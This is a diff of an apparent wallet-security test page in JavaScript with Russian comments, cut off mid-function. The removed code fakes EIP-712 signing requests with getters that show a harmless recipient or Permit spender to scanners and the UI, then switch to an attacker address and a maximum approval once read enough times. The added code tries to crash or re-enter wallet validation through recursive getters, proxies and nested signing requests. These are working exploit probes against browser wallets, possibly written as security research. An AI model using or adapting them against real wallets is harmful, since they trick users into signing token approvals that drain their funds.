@@ -3,477 +3,510 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>toctou max — tokdie.github.io</title>
+<title>permit-alt — reentrancy bench (tokdie.github.io)</title>
 <style>
-  :root{--bg:#0e1116;--panel:#161b22;--line:#2b3138;--txt:#c9d1d9;--ok:#3fb950;
-        --warn:#d29922;--bad:#f85149;--dim:#7d8590;--acc:#58a6ff;}
-  *{box-sizing:border-box}
-  body{margin:0;font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
-       background:var(--bg);color:var(--txt)}
-  h2{font-size:12px;margin:0 0 6px;color:var(--dim);
-     text-transform:uppercase;letter-spacing:.08em}
-  h3{font-size:11px;margin:8px 0 3px;color:var(--acc);
-     text-transform:uppercase;letter-spacing:.06em}
-  .wrap{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:10px;
-        max-width:1300px;margin:0 auto}
-  @media(max-width:860px){.wrap{grid-template-columns:1fr}}
-  .panel{background:var(--panel);border:1px solid var(--line);
-         border-radius:6px;padding:10px}
-  .panel.full{grid-column:1/-1}
-  button{background:#21262d;color:var(--txt);border:1px solid var(--line);
-         border-radius:4px;padding:5px 9px;font:inherit;cursor:pointer;margin:2px}
-  button:hover{border-color:var(--dim)}
-  button.d{color:var(--bad);border-color:var(--bad)}
-  button.w{color:var(--warn);border-color:var(--warn)}
-  button:disabled{opacity:.4;cursor:not-allowed}
-  pre{background:#0a0d12;border:1px solid var(--line);border-radius:4px;
-      padding:6px;margin:3px 0;max-height:320px;overflow:auto;
-      white-space:pre-wrap;word-break:break-all;font-size:11px}
-  .row{display:flex;gap:4px;align-items:center;margin:3px 0;flex-wrap:wrap}
-  .kv{display:grid;grid-template-columns:140px 1fr;gap:1px 8px}
-  .kv b{color:var(--dim);font-weight:400}
-  .pair{display:grid;grid-template-columns:1fr 1fr;gap:6px}
-  @media(max-width:860px){.pair{grid-template-columns:1fr}}
-  #log{grid-column:1/-1}
-  .hl{color:var(--bad)}
-  .ok{color:var(--ok)}
+  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
+          --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590; --accent:#58a6ff; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
+         background:var(--bg); color:var(--txt); }
+  h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
+       text-transform:uppercase; letter-spacing:.08em; }
+  h3 { font-size:11px; margin:10px 0 4px; color:var(--accent);
+       text-transform:uppercase; letter-spacing:.06em; }
+  .wrap { display:grid; grid-template-columns:1fr; gap:10px; padding:10px;
+          max-width:1000px; margin:0 auto; }
+  .panel { background:var(--panel); border:1px solid var(--line);
+           border-radius:6px; padding:10px; }
+  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
+           border-radius:4px; padding:5px 10px; font:inherit; cursor:pointer;
+           margin:2px; }
+  button:hover { border-color:var(--dim); }
+  button.danger { border-color:var(--bad); color:var(--bad); }
+  button.warn { border-color:var(--warn); color:var(--warn); }
+  button:disabled { opacity:.4; cursor:not-allowed; }
+  pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
+        padding:6px; margin:3px 0; max-height:320px; overflow:auto;
+        white-space:pre-wrap; word-break:break-all; font-size:11px; }
+  .row { display:flex; gap:4px; align-items:center; margin:4px 0; flex-wrap:wrap; }
+  .kv { display:grid; grid-template-columns:130px 1fr; gap:1px 8px; }
+  .kv b { color:var(--dim); font-weight:400; }
+  .badge { padding:1px 6px; border-radius:3px; font-size:10px; }
+  .badge.on  { background:#1a2f1a; color:var(--ok); }
+  .badge.off { background:#3a1a1a; color:var(--bad); }
+  #log { grid-column:1 / -1; }
+  .out-pair { display:grid; grid-template-columns:1fr 1fr; gap:6px; }
+  @media (max-width:860px) { .out-pair { grid-template-columns:1fr; } }
 </style>
 </head>
 <body>
+
 <div class="wrap">
 
-  <div class="panel full">
+  <div class="panel">
     <h2>environment</h2>
     <div class="kv" id="env"></div>
   </div>
 
-  <div class="panel full">
-    <h2>vector 2 — TOCTOU max — подтверждай подпись на экране</h2>
+  <div class="panel">
+    <h2>permit-alt — reentrancy / stack overflow</h2>
     <p style="color:var(--dim);margin:0 0 6px">
-      Каждый тест: getter читает N раз. Сканер/UI видит LEGIT.
-      Подпись (stringify) видит EVIL. Подтверди на экране — увидим sig.
+      Цель: уронить валидатор через рекурсивный getter, пока натив обрабатывает
+      <code>Permit</code>. Смотреть: где падает стек, что натив возвращает после
+      падения, доходит ли до подписи.
     </p>
 
-    <h3>a. чистый getter — порог по чтению</h3>
+    <h3>a. чистый stack overflow через getter</h3>
     <div class="row">
-      <button class="d" onclick="t_thresh(3)">thr=3 · to·EVIL на 3-м</button>
-      <button class="d" onclick="t_thresh(4)">thr=4 · amount·EVIL на 4-м</button>
-      <button class="d" onclick="t_thresh_split()">split · to@3, amount@4</button>
-      <button class="d" onclick="t_thresh_field()">field · только to</button>
+      <button class="danger" onclick="p_stack_pure()">stack: getter recursion</button>
+      <button class="danger" onclick="p_stack_nested()">stack: nested proxy</button>
+      <button class="danger" onclick="p_stack_permit()">stack: Permit spender</button>
     </div>
 
-    <h3>b. Permit — реальный вектор</h3>
+    <h3>b. реентранси через request</h3>
     <div class="row">
-      <button class="d" onclick="t_permit(3)">permit thr=3</button>
-      <button class="d" onclick="t_permit(4)">permit thr=4</button>
-      <button class="d" onclick="t_permit_alt()">permit · spender+value split</button>
+      <button class="danger" onclick="p_reenter_request()">reenter: request in getter</button>
+      <button class="danger" onclick="p_reenter_permit()">reenter: Permit in getter</button>
+      <button class="danger" onclick="p_reenter_chain()">reenter: chainId in getter</button>
     </div>
 
-    <h3>c. chainId — выравнивание и replay</h3>
+    <h3>c. реентранси через сериализацию</h3>
     <div class="row">
-      <button class="w" onclick="t_chain_probe()">probe: eth_chainId</button>
-      <button class="d" onclick="t_chain_align()">align: подставить chainId</button>
-      <button class="d" onclick="t_chain_swap()">swap: chainId 1 vs 56</button>
+      <button class="danger" onclick="p_reenter_toJSON()">reenter: toJSON recursion</button>
+      <button class="danger" onclick="p_reenter_ownKeys()">reenter: ownKeys recursion</button>
+      <button class="danger" onclick="p_reenter_symbol()">reenter: Symbol.toPrimitive</button>
     </div>
 
-    <h3>d. scan fallback — падение сканера</h3>
+    <h3>d. реальный мост (только если window.ethereum)</h3>
     <div class="row">
-      <button class="d" onclick="t_scan_throw()">throw на 2-м чтении</button>
-      <button class="d" onclick="t_scan_bigint()">bigint поле (сканер падает)</button>
-      <button class="d" onclick="t_scan_nan()">NaN / Infinity в value</button>
+      <button class="warn" onclick="p_real_stack()" id="btn_real_stack" disabled>
+        real: stack overflow
+      </button>
+      <button class="warn" onclick="p_real_reenter()" id="btn_real_reenter" disabled>
+        real: reentrancy via request
+      </button>
+      <button class="warn" onclick="p_real_toJSON()" id="btn_real_toJSON" disabled>
+        real: toJSON recursion
+      </button>
     </div>
 
-    <h3>e. форма payload — строка vs объект</h3>
-    <div class="row">
-      <button class="d" onclick="t_str_safe()">string · безопасный путь</button>
-      <button class="d" onclick="t_str_swap()">string · swap после stringify</button>
+    <div class="out-pair">
+      <div><h3>last result</h3><pre id="last_out">—</pre></div>
+      <div><h3>stack / phase</h3><pre id="phase_out">—</pre></div>
     </div>
-
-    <h3>f. proxy — обход снапшота</h3>
-    <div class="row">
-      <button class="d" onclick="t_proxy_get()">proxy get trap</button>
-      <button class="d" onclick="t_proxy_toJSON()">proxy toJSON hijack</button>
-      <button class="d" onclick="t_proxy_ownkeys()">proxy ownKeys</button>
-    </div>
-
-    <div class="pair">
-      <div><h3>shown at render</h3><pre id="shown_out">—</pre></div>
-      <div><h3>signed / returned</h3><pre id="signed_out">—</pre></div>
-    </div>
-    <h3>summary</h3><pre id="summary_out">—</pre>
   </div>
 
-  <div class="panel full">
-    <h2>state</h2>
-    <div class="kv" id="state"></div>
-  </div>
-
-  <div class="panel full" id="log">
+  <div class="panel" id="log">
     <h2>event log</h2>
     <div class="row">
       <button onclick="clearLog()">clear</button>
-      <button onclick="dumpLog()">dump</button>
+      <button onclick="dumpLog()">copy</button>
     </div>
     <pre id="log_out">—</pre>
   </div>
+
 </div>
 
 <script>
+/* ─────────────  config  ───────────── */
 const ORIGIN = location.origin;
 const IS_REAL = !!window.ethereum;
-let FROM = null, CHAIN = 1;
 
-/* ── trace ── */
-let SEQ = 0;
-const tid = () => 'T' + String(++SEQ).padStart(3,'0');
-
-function log(kind, msg, data){
+/* ─────────────  log  ───────────── */
+const log = (kind, msg, data) => {
   const el = document.getElementById('log_out');
   const line = `[${new Date().toISOString().slice(11,23)}] ${kind.padEnd(8)} ${msg}`;
   const body = data !== undefined
     ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
   el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
   el.scrollTop = el.scrollHeight;
-}
-function out(id, s){ document.getElementById(id).textContent = s || '—'; }
-function clearLog(){ document.getElementById('log_out').textContent = '—'; }
-function dumpLog(){
+};
+
+const outLast = (o) => {
+  document.getElementById('last_out').textContent =
+    typeof o === 'string' ? o : JSON.stringify(o, null, 2);
+};
+const outPhase = (o) => {
+  document.getElementById('phase_out').textContent =
+    typeof o === 'string' ? o : JSON.stringify(o, null, 2);
+};
+
+const clearLog = () => { document.getElementById('log_out').textContent = '—'; };
+const dumpLog = () => {
   const t = document.getElementById('log_out').textContent;
   navigator.clipboard && navigator.clipboard.writeText(t);
-  log('DUMP','copied',{len:t.length});
-}
+  log('DUMP', 'copied', { len: t.length });
+};
 
-/* ── getter factory: счётчик + стек, без _reads в payload ── */
-function makeTrap(fields, threshold, mode = 'once'){
-  let n = 0;
-  const reads = [];
-  const values = {};
-  for (const f of fields){
-    values[f] = { legit: fields[f].legit, evil: fields[f].evil };
-  }
-  const trap = {};
-  for (const f of Object.keys(fields)){
-    Object.defineProperty(trap, f, {
-      get(){
-        n++;
-        const useEvil = mode === 'once'
-          ? n >= threshold
-          : (f === 'to' ? n >= threshold : n > threshold);
-        const v = useEvil ? values[f].evil : values[f].legit;
-        const stack = (new Error().stack || '').split('\n').slice(2,6).join(' | ');
-        reads.push({ n, f, v, mode: useEvil ? 'EVIL' : 'LEGIT', stack });
-        log('READ', `#${n} · ${f} · ${useEvil?'EVIL':'LEGIT'}`, { v, stack });
-        return v;
-      },
-      enumerable: true,
-      configurable: true,
-    });
-  }
-  return { trap, reads, get n(){ return n; } };
-}
+/* ─────────────  permit base payload  ───────────── */
+const permitBase = () => ({
+  domain: { name: 'Tokdie', version: '1', chainId: 1,
+            verifyingContract: '0x0000000000000000000000000000000000000000' },
+  types: { Permit: [
+    { name: 'owner', type: 'address' },
+    { name: 'spender', type: 'address' },
+    { name: 'value', type: 'uint256' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'deadline', type: 'uint256' },
+  ]},
+  primaryType: 'Permit',
+  message: {
+    owner: '0x20eB588526dac042F39D60A46dC0E7FbB5203945',
+    spender: '0x0000000000000000000000000000000000000000',
+    value: '100',
+    nonce: 0,
+    deadline: 9999999999,
+  },
+});
 
-function baseOrder(){
-  return {
-    domain:{name:'Tokdie',version:'1',chainId:CHAIN,
-            verifyingContract:'0x0000000000000000000000000000000000000000'},
-    types:{Order:[{name:'to',type:'address'},{name:'amount',type:'uint256'}]},
-    primaryType:'Order',
-    message:{to:'0x0000000000000000000000000000000000000000',amount:'0'},
-  };
-}
-function basePermit(){
-  return {
-    domain:{name:'Tokdie',version:'1',chainId:CHAIN,
-            verifyingContract:'0x0000000000000000000000000000000000000000'},
-    types:{Permit:[
-      {name:'owner',type:'address'},{name:'spender',type:'address'},
-      {name:'value',type:'uint256'},{name:'nonce',type:'uint256'},
-      {name:'deadline',type:'uint256'}]},
-    primaryType:'Permit',
-    message:{owner:'0xLEGIT000000000000000000000000000000',
-             spender:'0xLEGIT000000000000000000000000000000',
-             value:'0',nonce:'0',deadline:'9999999999'},
-  };
-}
-
-/* ── реальный вызов ── */
-async function ensure(){
+const getAccount = async () => {
   if (!window.ethereum) throw new Error('no ethereum');
-  if (FROM) return FROM;
-  const a = await window.ethereum.request({method:'eth_requestAccounts'});
-  FROM = a[0];
-  try { CHAIN = parseInt(await window.ethereum.request({method:'eth_chainId'}),16) || 1; }
-  catch { CHAIN = 1; }
-  log('ENV','account+chain',{FROM,CHAIN});
-  renderEnv();
-  return FROM;
-}
+  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  return accounts[0];
+};
 
-async function sendTyped(label, payload){
-  const id = tid();
-  log('REQ', `${label} · ${id}`, {type: typeof payload});
-  out('shown_out','—'); out('signed_out','—');
-  try {
-    const sig = await window.ethereum.request({
-      method:'eth_signTypedData_v4',
-      params:[FROM, payload],  // объект, не строка — ключевой момент
-    });
-    log('SIG', `${label} · ${id}`, {sig});
-    out('signed_out', sig);
-    out('summary_out', `id: ${id}\nlabel: ${label}\nsig: ${sig}`);
-    return sig;
-  } catch(e){
-    const raw = String(e && e.message || e);
-    log('ERR', `${label} · ${id}`, {code:e.code,message:e.message,raw});
-    out('signed_out','error: '+raw);
-    out('summary_out', `id: ${id}\nlabel: ${label}\nerror: ${raw}\ncode: ${e.code}`);
-    return null;
-  }
-}
+/* ─────────────  a. чистый stack overflow  ───────────── */
 
-/* ── a. чистый getter ── */
-
-async function t_thresh(thr){
-  await ensure();
-  const p = baseOrder();
-  const {trap, reads} = makeTrap(
-    {to:{legit:'0x0000000000000000000000000000000000000000',
-         evil:'0x000000000000000000000000000000000000dEaD'},
-     amount:{legit:'100',evil:'999999'}},
-    thr, 'once'
-  );
-  p.message = trap;
-  out('shown_out', 'GETTER: threshold='+thr+'\nобъект уйдёт в мост. Смотри стек в логе.');
-  const sig = await sendTyped('thr-'+thr, p);
-  log('READS', `thr-${thr} · total=${reads.length}`, reads);
-}
-
-async function t_thresh_split(){
-  await ensure();
-  const p = baseOrder();
-  const {trap, reads} = makeTrap(
-    {to:{legit:'0x0000000000000000000000000000000000000000',
-         evil:'0x000000000000000000000000000000000000dEaD'},
-     amount:{legit:'100',evil:'999999'}},
-    3, 'split'
-  );
-  p.message = trap;
-  const sig = await sendTyped('thr-split', p);
-  log('READS', 'thr-split', reads);
-}
-
-async function t_thresh_field(){
-  await ensure();
-  const p = baseOrder();
-  let n = 0;
-  const to = {};
-  Object.defineProperty(to, 'to', {get(){
-    n++;
-    const v = n >= 2 ? '0x000000000000000000000000000000000000dEaD'
-                    : '0x0000000000000000000000000000000000000000';
-    log('READ', `to #${n}`, {v, stack:(new Error().stack||'').split('\n').slice(2,5).join(' | ')});
-    return v;
-  }, enumerable:true, configurable:true});
-  Object.defineProperty(to, 'amount', {get(){ return '100'; }, enumerable:true, configurable:true});
-  p.message = to;
-  await sendTyped('field-to', p);
-}
-
-/* ── b. Permit ── */
-
-async function t_permit(thr){
-  await ensure();
-  const p = basePermit();
-  const {trap, reads} = makeTrap(
-    {spender:{legit:'0x0000000000000000000000000000000000000000',
-              evil:'0x000000000000000000000000000000000000dEaD'},
-     value:{legit:'0',evil:'115792089237316195423570985008687907853269984665640564039457584007913129639935'}},
-    thr, 'once'
-  );
-  p.message = Object.assign({}, p.message, trap);
-  // переопределяем owner/nonce/deadline как литералы
-  const msg = {owner:p.message.owner, nonce:p.message.nonce, deadline:p.message.deadline};
-  for (const k of Object.keys(msg)) Object.defineProperty(p.message, k, {value:msg[k], enumerable:true});
-  const sig = await sendTyped('permit-'+thr, p);
-  log('READS', `permit-${thr}`, reads);
-}
-
-async function t_permit_alt(){
-  await ensure();
-  const p = basePermit();
-  let n = 0;
-  const msg = {};
-  for (const f of ['owner','spender','value','nonce','deadline']){
-    Object.defineProperty(msg, f, {
-      get(){
-        n++;
-        let v;
-        if (f === 'spender') v = n >= 3 ? '0x000000000000000000000000000000000000dEaD'
-                                        : '0x0000000000000000000000000000000000000000';
-        else if (f === 'value') v = n >= 4 ? '999999' : '0';
-        else v = p.message[f];
-        log('READ', `permit-alt #${n} ${f}`, {v, stack:(new Error().stack||'').split('\n').slice(2,5).join(' | ')});
-        return v;
-      }, enumerable:true, configurable:true,
-    });
-  }
-  p.message = msg;
-  await sendTyped('permit-alt', p);
-}
-
-/* ── c. chainId ── */
-
-async function t_chain_probe(){
-  await ensure();
-  log('CHAIN','active',{CHAIN});
-  try {
-    const c = await window.ethereum.request({method:'eth_chainId'});
-    log('CHAIN','eth_chainId',{hex:c,dec:parseInt(c,16)});
-  } catch(e){ log('CHAIN','error',{m:e.message}); }
-}
-
-async function t_chain_align(){
-  await ensure();
-  const p = baseOrder();
-  p.domain.chainId = CHAIN;
-  const {trap} = makeTrap(
-    {to:{legit:'0x0000000000000000000000000000000000000000',
-         evil:'0x000000000000000000000000000000000000dEaD'},
-     amount:{legit:'100',evil:'999999'}},
-    3,'once'
-  );
-  p.message = trap;
-  await sendTyped('chain-align', p);
-}
-
-async function t_chain_swap(){
-  await ensure();
-  const p1 = baseOrder(); p1.domain.chainId = CHAIN;
-  const p2 = baseOrder(); p2.domain.chainId = CHAIN === 1 ? 56 : 1;
-  const s1 = await sendTyped('chain-A', p1);
-  const s2 = await sendTyped('chain-B', p2);
-  log('CHAIN','compare',{same: s1===s2, s1, s2});
-}
-
-/* ── d. scan fallback ── */
-
-async function t_scan_throw(){
-  await ensure();
-  const p = baseOrder();
-  let n = 0;
-  const msg = {};
-  for (const f of ['to','amount']){
-    Object.defineProperty(msg, f, {get(){
-      n++;
-      if (n === 2) throw new Error('scan trap');
-      return f === 'to' ? '0x0000000000000000000000000000000000000000' : '100';
-    }, enumerable:true, configurable:true});
-  }
-  p.message = msg;
-  await sendTyped('scan-throw', p);
-}
-
-async function t_scan_bigint(){
-  await ensure();
-  const p = baseOrder();
+function p_stack_pure() {
+  let depth = 0;
+  const recurse = () => { depth++; return recurse(); };
+  const p = permitBase();
   p.message = {
-    get to(){ return '0x0000000000000000000000000000000000000000'; },
-    get amount(){ return 10n ** 30n; },  // bigint — stringify упадёт в нативе?
+    get spender() {
+      depth++;
+      if (depth > 1000) { log('STACK', 'depth guard', { depth }); return '0x0'; }
+      return recurse();
+    },
+    value: '100',
   };
-  await sendTyped('scan-bigint', p);
+  log('REQ', 'stack-pure · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'stack-pure · sig', { sig }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'stack-pure', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
 }
 
-async function t_scan_nan(){
-  await ensure();
-  const p = baseOrder();
+function p_stack_nested() {
+  let depth = 0;
+  const make = (n) => n > 50 ? {} : { nested: make(n + 1), get evil() { depth++; return make(n + 1); } };
+  const p = permitBase();
+  p.message = make(0);
+  log('REQ', 'stack-nested · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'stack-nested · sig', { sig }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'stack-nested', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
+}
+
+function p_stack_permit() {
+  let depth = 0;
+  const p = permitBase();
   p.message = {
-    get to(){ return '0x0000000000000000000000000000000000000000'; },
-    get amount(){ return NaN; },
+    get spender() {
+      depth++;
+      log('READ', 'stack-permit · spender', { depth });
+      if (depth > 500) return '0x0';
+      return '0xATTACKER0000000000000000000000000000';
+    },
+    get value() {
+      depth++;
+      if (depth > 500) return '0';
+      return 'MAX';
+    },
+    owner: '0x20eB588526dac042F39D60A46dC0E7FbB5203945',
+    nonce: 0,
+    deadline: 9999999999,
   };
-  await sendTyped('scan-nan', p);
+  log('REQ', 'stack-permit · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'stack-permit · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'stack-permit', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
 }
 
-/* ── e. string ── */
+/* ─────────────  b. реентранси через request  ───────────── */
 
-async function t_str_safe(){
-  await ensure();
-  const p = baseOrder();
-  p.message = {to:'0x0000000000000000000000000000000000000000', amount:'100'};
-  const s = JSON.stringify(p);  // здесь getter бы умер, но литералы
-  log('STR','serialized',{len:s.length});
-  await sendTyped('str-safe', s);
+function p_reenter_request() {
+  let depth = 0;
+  const p = permitBase();
+  p.message = {
+    get spender() {
+      depth++;
+      if (depth === 1 && window.ethereum) {
+        log('REENTER', 'stack-req · nested request', { depth });
+        window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', permitBase()] })
+          .then(s => log('REENTER', 'stack-req · nested sig', { s }))
+          .catch(e => log('REENTER', 'stack-req · nested err', { message: e.message, code: e.code }));
+      }
+      return '0xATTACKER0000000000000000000000000000';
+    },
+    value: 'MAX',
+    owner: '0x20eB588526dac042F39D60A46dC0E7FbB5203945',
+    nonce: 0,
+    deadline: 9999999999,
+  };
+  log('REQ', 'stack-req · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'stack-req · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'stack-req', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
 }
 
-async function t_str_swap(){
-  await ensure();
-  const p = baseOrder();
-  const {trap} = makeTrap(
-    {to:{legit:'0x0000000000000000000000000000000000000000',
-         evil:'0x000000000000000000000000000000000000dEaD'},
-     amount:{legit:'100',evil:'999999'}},
-    2,'once'
-  );
-  p.message = trap;
-  const s = JSON.stringify(p);  // getter сработает здесь, EVIL уже на 2-м
-  log('STR','serialized',{len:s.length, preview:s.slice(0,120)});
-  await sendTyped('str-swap', s);
+function p_reenter_permit() {
+  let depth = 0;
+  const p = permitBase();
+  p.message = {
+    get spender() {
+      depth++;
+      if (depth === 1 && window.ethereum) {
+        const nested = permitBase();
+        nested.message.spender = '0xATTACKER0000000000000000000000000000';
+        nested.message.value = 'MAX';
+        log('REENTER', 'stack-permit-reenter · nested Permit', { depth });
+        window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', nested] })
+          .then(s => log('REENTER', 'stack-permit-reenter · nested sig', { s }))
+          .catch(e => log('REENTER', 'stack-permit-reenter · nested err', { message: e.message, code: e.code }));
+      }
+      return '0x0000000000000000000000000000000000000000';
+    },
+    value: '100',
+    owner: '0x20eB588526dac042F39D60A46dC0E7FbB5203945',
+    nonce: 0,
+    deadline: 9999999999,
+  };
+  log('REQ', 'stack-permit-reenter · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'stack-permit-reenter · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'stack-permit-reenter', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
 }
 
-/* ── f. proxy ── */
-
-async function t_proxy_get(){
-  await ensure();
-  const base = baseOrder();
-  let n = 0;
-  const p = new Proxy(base, {get(t,k,r){
-    n++;
-    if (k === 'message' && n > 3){
-      log('TRAP','proxy get · message EVIL',{n});
-      return {to:'0x000000000000000000000000000000000000dEaD', amount:'999999'};
-    }
-    return Reflect.get(t,k,r);
-  }});
-  await sendTyped('proxy-get', p);
-}
-
-async function t_proxy_toJSON(){
-  await ensure();
-  const base = baseOrder();
-  const p = new Proxy(base, {get(t,k,r){
-    if (k === 'toJSON'){
-      log('TRAP','toJSON hijack',{});
-      return () => ({...base, message:{to:'0x000000000000000000000000000000000000dEaD',amount:'999999'}});
-    }
-    return Reflect.get(t,k,r);
-  }});
-  await sendTyped('proxy-toJSON', p);
-}
-
-async function t_proxy_ownkeys(){
-  await ensure();
-  const base = baseOrder();
-  const p = new Proxy(base, {
-    ownKeys(t){ log('TRAP','ownKeys',{keys:Reflect.ownKeys(t)}); return Reflect.ownKeys(t); },
-    getOwnPropertyDescriptor(t,k){ return Reflect.getOwnPropertyDescriptor(t,k); },
+function p_reenter_chain() {
+  let depth = 0;
+  const p = permitBase();
+  const origChain = p.domain.chainId;
+  Object.defineProperty(p.domain, 'chainId', {
+    get() {
+      depth++;
+      if (depth === 1 && window.ethereum) {
+        log('REENTER', 'stack-chain · nested eth_chainId', { depth });
+        window.ethereum.request({ method: 'eth_chainId' })
+          .then(id => log('REENTER', 'stack-chain · nested chainId', { id }))
+          .catch(e => log('REENTER', 'stack-chain · nested err', { message: e.message }));
+      }
+      return origChain;
+    },
   });
-  await sendTyped('proxy-ownKeys', p);
+  log('REQ', 'stack-chain · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'stack-chain · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'stack-chain', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
 }
 
-/* ── env / state ── */
-function renderEnv(){
+/* ─────────────  c. реентранси через сериализацию  ───────────── */
+
+function p_reenter_toJSON() {
+  let depth = 0;
+  const base = permitBase();
+  const p = {
+    domain: base.domain,
+    types: base.types,
+    primaryType: base.primaryType,
+    message: base.message,
+    get toJSON() {
+      depth++;
+      if (depth === 1 && window.ethereum) {
+        log('REENTER', 'toJSON · nested request', { depth });
+        window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', permitBase()] })
+          .then(s => log('REENTER', 'toJSON · nested sig', { s }))
+          .catch(e => log('REENTER', 'toJSON · nested err', { message: e.message, code: e.code }));
+      }
+      return () => base;
+    },
+  };
+  log('REQ', 'toJSON · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'toJSON · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'toJSON', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
+}
+
+function p_reenter_ownKeys() {
+  let depth = 0;
+  const base = permitBase();
+  const p = new Proxy(base, {
+    ownKeys(t) {
+      depth++;
+      if (depth === 1 && window.ethereum) {
+        log('REENTER', 'ownKeys · nested request', { depth });
+        window.ethereum.request({ method: 'eth_chainId' })
+          .then(id => log('REENTER', 'ownKeys · nested chainId', { id }))
+          .catch(e => log('REENTER', 'ownKeys · nested err', { message: e.message }));
+      }
+      return Reflect.ownKeys(t);
+    },
+    getOwnPropertyDescriptor(t, k) { return Reflect.getOwnPropertyDescriptor(t, k); },
+  });
+  log('REQ', 'ownKeys · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'ownKeys · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'ownKeys', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
+}
+
+function p_reenter_symbol() {
+  let depth = 0;
+  const base = permitBase();
+  const p = {
+    ...base,
+    [Symbol.toPrimitive](hint) {
+      depth++;
+      log('SYMBOL', 'toPrimitive called', { hint, depth });
+      return JSON.stringify(base);
+    },
+  };
+  log('REQ', 'symbol · sending', { depth });
+  const req = window.ethereum
+    ? window.ethereum.request({ method: 'eth_signTypedData_v4', params: [window._FROM || '0x0', p] })
+    : Promise.reject(new Error('no ethereum'));
+  req.then(sig => { log('OK', 'symbol · sig', { sig, depth }); outLast({ sig, depth }); })
+     .catch(e => { log('ERR', 'symbol', { message: e.message, code: e.code, depth }); outLast({ err: e.message, code: e.code, depth }); });
+}
+
+/* ─────────────  d. real bridge  ───────────── */
+
+async function p_real_stack() {
+  if (!window.ethereum) return outLast('no ethereum');
+  try {
+    const from = await getAccount();
+    window._FROM = from;
+    log('ENV', 'real-stack · account', { from });
+    let depth = 0;
+    const p = permitBase();
+    p.message = {
+      get spender() {
+        depth++;
+        if (depth > 1000) return '0x0';
+        return '0xATTACKER0000000000000000000000000000';
+      },
+      value: '100',
+      owner: from,
+      nonce: 0,
+      deadline: 9999999999,
+    };
+    log('REQ', 'real-stack · sending', { depth });
+    const sig = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [from, p],
+    });
+    log('OK', 'real-stack · sig', { sig, depth });
+    outLast({ sig, depth });
+  } catch (e) {
+    log('ERR', 'real-stack', { message: e.message, code: e.code, depth: '—' });
+    outLast({ err: e.message, code: e.code });
+  }
+}
+
+async function p_real_reenter() {
+  if (!window.ethereum) return outLast('no ethereum');
+  try {
+    const from = await getAccount();
+    window._FROM = from;
+    log('ENV', 'real-reenter · account', { from });
+    let depth = 0;
+    const p = permitBase();
+    p.message = {
+      get spender() {
+        depth++;
+        if (depth === 1) {
+          log('REENTER', 'real-reenter · nested request', { depth });
+          window.ethereum.request({ method: 'eth_signTypedData_v4', params: [from, permitBase()] })
